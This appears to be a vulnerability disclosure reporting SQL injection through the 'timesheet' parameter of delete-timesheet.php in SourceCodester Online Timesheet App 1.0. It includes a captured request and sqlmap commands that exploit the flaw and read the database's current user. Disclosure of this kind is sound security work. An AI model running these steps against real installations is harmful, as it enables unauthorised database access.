_***A sql injection vulnerability in has been found in SourceCodester Online Timesheet App 1.0.(delete-timesheet.php). This issue affects some unknown processing of the file /endpoint/delete-timesheet.php. The manipulation of the argument timesheet leads to sql injection.***_

_***Explaination:***_

SQL injection errors occur when:

Data enters a program from an untrusted source.

The data is used to dynamically construct a SQL query.

_***Target Code source:***_

https://www.sourcecodester.com/php/17106/online-timesheet-app-using-php-and-mysql-source-code.html

_***Url***_: online-timesheet/endpoint/delete-timesheet.php

_***Abstract***_:

SQL Injection vulnerability in Online Timesheet App v.1.0 allows an attacker to execute arbitrary code via a crafted payload to the timesheet parameter in the delete-timesheet.php component.

_***Details:***_

In this case the data is passed to execute in delete-timesheet.php: 
![](Pasted%20image%2020240925105623.png)

We get the request when we click the “delete” button on the WEB interface: 
![](Pasted%20image%2020240925111148.png)

1.txt:
GET /online-timesheet/endpoint/delete-timesheet.php?timesheet=2 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Cookie: PHPSESSID=tdt4mlc4b6qnm7nuivikbm9ii2
Host: 172.20.224.1
Referer: [http://172.20.224.1/online-timesheet/](http://172.20.224.1/online-timesheet/)
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36

./sqlmap.py -r 1.txt
![](Pasted%20image%2020240925111225.png)

./sqlmap.py -r 1.txt --current-user
![](Pasted%20image%2020240925111240.png)


